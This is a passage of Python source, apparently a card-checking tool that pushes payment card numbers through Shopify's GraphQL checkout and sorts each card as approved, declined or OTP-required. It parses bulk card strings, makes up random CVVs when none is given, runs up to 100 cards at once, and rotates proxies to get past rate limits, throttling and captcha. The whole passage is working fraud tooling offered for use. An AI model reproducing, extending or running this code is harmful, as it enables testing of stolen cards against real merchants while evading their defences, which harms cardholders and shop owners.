                            session, graphql_url, submit_params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                        )
                except Exception as ex:
                    logger.warning(f"Order total sync retry error: {ex}")

            if "Your order total has changed." in text:
                return False, "Order total changed", gateway, total_price, currency
            if "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in text:
                return False, "MERCHANDISE_EXPECTED_PRICE_MISMATCH", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})

                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')

                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency

                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency

                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency

                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency

                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency

                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(0.1)  # Initial polling wait

            poll_wait = 1.0  # default wait between polls
            for i in range(8):  # 4 → 8: slow banks ke liye zyada chances
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=1, proxy=proxy
                )

                if not response:
                    await asyncio.sleep(poll_wait)
                    continue

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})

                    if receipt_data:
                        typename = receipt_data.get('__typename', '')

                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code')
                                if code:
                                    return True, code, gateway, total_price, currency
                                return True, 'PAYMENT_FAILED', gateway, total_price, currency
                            # Handle other error types
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency

                        if typename in ['ProcessingReceipt', 'WaitingReceipt']:
                            # Shopify ka pollDelay use karo agar available ho
                            server_delay = receipt_data.get('pollDelay')
                            if server_delay and isinstance(server_delay, (int, float)) and server_delay > 0:
                                poll_wait = min(server_delay / 1000.0, 0.5)  # ms → sec, max 0.5s
                            await asyncio.sleep(poll_wait)
                            continue

                except (json.JSONDecodeError, KeyError, TypeError) as e:
                    # FIX 4: Specific exception handling
                    pass

                if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                    await asyncio.sleep(poll_wait)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency

            if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                receipt_obj = res_json.get('data', {}).get('receipt') or {}
                proc_err = receipt_obj.get('processingError') or {}
                if proc_err:
                    code = proc_err.get('code') or proc_err.get('__typename')
                    if code:
                        return True, extract_clean_response(code), gateway, total_price, currency

                if "shopify_payments" in str(res_json) or receipt_obj.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", gateway, total_price, currency

                errors = res_json.get('errors', [])
                if errors:
                    err_msg = errors[0].get('message', '') or errors[0].get('code', '')
                    clean_err = extract_clean_response(err_msg)
                    if clean_err and clean_err != "UNKNOWN_ERROR":
                        return True, clean_err, gateway, total_price, currency
            except (json.JSONDecodeError, KeyError, TypeError):
                pass

            clean_code = extract_clean_response(final_text)
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, clean_code if clean_code and clean_code != "UNKNOWN_ERROR" else "CARD_DECLINED", gateway, total_price, currency
            elif clean_code and clean_code != "UNKNOWN_ERROR":
                return True, clean_code, gateway, total_price, currency
            else:
                return True, "CARD_DECLINED", gateway, total_price, currency

    except asyncio.TimeoutError:
        # FIX 4: Specific timeout handling
        return False, "Request timed out", gateway, total_price, currency
    except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
        # FIX 4: Specific proxy error
        return False, f"Proxy Error: Authentication failed - {str(e)}", gateway, total_price, currency
    except aiohttp.ClientConnectorError as e:
        # FIX 4: Specific connection error
        return False, f"Proxy Error: Could not connect - {str(e)}", gateway, total_price, currency
    except aiohttp.ClientError as e:
        # FIX 4: Specific network error
        return False, f"Network error: {str(e)}", gateway, total_price, currency
    except json.JSONDecodeError as e:
        # FIX 4: Specific JSON error
        return False, f"Invalid response format: {str(e)}", gateway, total_price, currency
    except Exception as e:
        # FIX 4: Last resort with better context
        err = str(e).lower()
        if 'proxy' in err or '407' in err or 'tunnel' in err:
            return False, "Proxy Error: Authentication failed or proxy unreachable", gateway, total_price, currency
        elif 'timeout' in err or 'timed out' in err:
            return False, "Proxy Error: Connection timed out", gateway, total_price, currency
        elif 'clientconnector' in err or 'cannot connect' in err:
            return False, "Proxy Error: Could not connect", gateway, total_price, currency
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

# =========== INPUT PARSER ===============
def parse_cc_string(cc_string):
    """
    Intelligent card parser supporting:
    - 4 parts: CC|MM|YYYY|CVV (or CC|MM|YY|CVV)
    - 3 parts: CC|MM|YYYY (or CC|MM|YY) -> auto-generates appropriate CVV (Amex: 4-digit, Other: 3-digit)
    - Delimiters: |, :, /, ;, or whitespace
    - Auto-normalizes Month (e.g. 3 -> 03) and Year (e.g. 26 -> 2026)
    - Auto-detects swapped Month/Year order (e.g. CC|2027|05)
    """
    if not cc_string or not isinstance(cc_string, str):
        raise ValueError("Invalid CC format. Expected CC|MM|YYYY|CVV or CC|MM|YYYY")

    raw = cc_string.strip()
    # Normalize multiple delimiters (|, :, /, ;, tabs/spaces) to pipe
    normalized = re.sub(r'[:;/ \t]+', '|', raw)
    parts = [p.strip() for p in normalized.split('|') if p.strip()]

    if len(parts) < 3:
        raise ValueError("Invalid CC format. Expected CC|MM|YYYY|CVV or CC|MM|YYYY")

    # Card number digits only
    cc_num = re.sub(r'\D', '', parts[0])
    if len(cc_num) < 12 or len(cc_num) > 19:
        raise ValueError(f"Invalid card number length ({len(cc_num)} digits)")

    p1 = parts[1].strip()
    p2 = parts[2].strip()

    def _is_year_val(v):
        try:
            iv = int(v)
            return (2020 <= iv <= 2050) or (24 <= iv <= 50)
        except Exception:
            return False

    def _is_month_val(v):
        try:
            iv = int(v)
            return 1 <= iv <= 12
        except Exception:
            return False

    # Swap detection if Month and Year are inverted
    if _is_month_val(p1) and _is_year_val(p2):
        month_raw, year_raw = p1, p2
    elif _is_year_val(p1) and _is_month_val(p2):
        year_raw, month_raw = p1, p2
    else:
        month_raw, year_raw = p1, p2

    # Month 2-digit padding & validation
    month_clean = re.sub(r'\D', '', month_raw)
    if not month_clean:
        raise ValueError("Invalid month format")
    month = month_clean.zfill(2)
    if not (1 <= int(month) <= 12):
        raise ValueError(f"Invalid month: {month} (must be 01-12)")

    # Year 4-digit expansion & validation
    year_clean = re.sub(r'\D', '', year_raw)
    if len(year_clean) == 2:
        year = "20" + year_clean
    elif len(year_clean) == 4:
        year = year_clean
    else:
        raise ValueError(f"Invalid year format: {year_raw}")

    # CVV resolution
    if len(parts) >= 4:
        cvv = re.sub(r'\D', '', parts[3])
        if not cvv:
            # Auto-fallback if empty CVV provided
            cvv = str(random.randint(1000, 9999)) if cc_num.startswith(('34', '37')) else str(random.randint(100, 999))
    else:
        # Auto-detect CVV for 3-part card (CC|MM|YYYY)
        if cc_num.startswith(('34', '37')):
            cvv = str(random.randint(1000, 9999))
        else:
            cvv = str(random.randint(100, 999))

    return {
        'cc': cc_num,
        'mes': month,
        'ano': year,
        'cvv': cvv
    }


# =========== CONFIGURATION ===============
# Timeout Constants - Consistent behavior ke liye
TIMEOUT_PRODUCT_FETCH = 15
TIMEOUT_CHECKOUT = 40
TIMEOUT_GRAPHQL = 20
TIMEOUT_VAULT = 12
TIMEOUT_ENDPOINT = 180
MAX_BACKOFF_DELAY = 1.5  # Maximum retry delay in seconds

# =========== CONCURRENCY ENGINE ===============
MAX_CONCURRENT = 100         # max cards in flight at once
_semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)

def get_semaphore():
    """Return the shared asyncio semaphore, initialized on the active event loop."""
    global _semaphore
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    return _semaphore

async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list, start_proxy_idx=0):
    """Process a single card, guarded by the concurrency semaphore, with smart retry & proxy rotation."""
    max_retries = 3
    sem = get_semaphore()
    async with sem:
        for attempt in range(max_retries):
            current_proxy = proxy_list[(start_proxy_idx + attempt) % len(proxy_list)] if proxy_list else None

            try:
                success, msg, gw, price, cur = await process_card(cc, mes, ano, cvv, site_url, variant_id, current_proxy)

                # Transient & Rate-Limit (429) errors that trigger proxy rotation and retry
                error_msg_lower = str(msg).lower()
                transient_errors = [
                    'proxy error', 'timeout', 'clientoserror', 'clientconnectorerror',
                    'serverdisconnectederror', 'error processing card', 'failed to get session token',
                    'request failed', 'throttled', 'captcha_required', '429', 'status: 429',
                    'rate limit', 'too many requests', 'checkout page failed: http 429'
                ]
                is_transient = any(t in error_msg_lower for t in transient_errors)

                if not success and is_transient and attempt < max_retries - 1:
                    next_p = proxy_list[(start_proxy_idx + attempt + 1) % len(proxy_list)] if proxy_list else "None"
                    logger.warning(
                        f"[Retry {attempt+1}/{max_retries}] ⚠️ Rate-Limit / Transient Error: {msg[:70]} | "
                        f"Rotating to next proxy: {next_p[:35]} | Site: {site_url[:40]}"
                    )
                    delay = 1.5 if ('429' in error_msg_lower or 'throttled' in error_msg_lower) else min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                    await asyncio.sleep(delay)
                    continue

                return success, msg, gw, price, cur
            except asyncio.TimeoutError:
                logger.warning(f"[Retry {attempt+1}/{max_retries}] Timeout | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'}")
                if attempt < max_retries - 1:
                    delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                    await asyncio.sleep(delay)
                    continue
                logger.error(f"[FAILED] Timeout after {max_retries} retries | Site: {site_url}")
                return False, "Request timed out after retries", "UNKNOWN", "0.00", "USD"
            except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
                logger.warning(f"[Retry {attempt+1}/{max_retries}] Proxy auth failed | Proxy: {current_proxy[:50] if current_proxy else 'None'} | Error: {str(e)[:100]}")
                if attempt < max_retries - 1:
                    delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                    await asyncio.sleep(delay)
                    continue
                logger.error(f"[FAILED] Proxy auth failed after {max_retries} retries | Proxy: {current_proxy}")
                return False, f"Proxy authentication failed: {str(e)}", "UNKNOWN", "0.00", "USD"
            except aiohttp.ClientConnectorError as e:
                logger.warning(f"[Retry {attempt+1}/{max_retries}] Connection failed | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'} | Error: {str(e)[:100]}")
                if attempt < max_retries - 1:
                    delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                    await asyncio.sleep(delay)
                    continue
                logger.error(f"[FAILED] Connection failed after {max_retries} retries | Site: {site_url} | Error: {str(e)}")
                return False, f"Connection failed: {str(e)}", "UNKNOWN", "0.00", "USD"
            except Exception as e:
                logger.warning(f"[Retry {attempt+1}/{max_retries}] Unexpected error | Site: {site_url[:50]} | Proxy: {current_proxy[:30] if current_proxy else 'None'} | Error: {str(e)[:150]}")
                if attempt < max_retries - 1:
                    delay = min((1.2 ** attempt) + random.uniform(0, 0.3), MAX_BACKOFF_DELAY)
                    await asyncio.sleep(delay)
                    continue
                logger.error(f"[FAILED] Error after {max_retries} retries | Site: {site_url} | Error: {str(e)}")
                return False, f"Error after {max_retries} retries: {str(e)}", "UNKNOWN", "0.00", "USD"

def _build_result(cc_string, success, message, gateway, price, currency, elapsed=None):
    clean_response = extract_clean_response(message)
    result = {
        "Gateway": gateway,
        "Price": round(float(price), 2) if price.replace('.', '', 1).isdigit() else 0.0,
        "Response": clean_response,
        "Status": success,
        "cc": cc_string,
        "Time": f"{elapsed:.2f}s" if elapsed is not None else "N/A"
    }
    return result

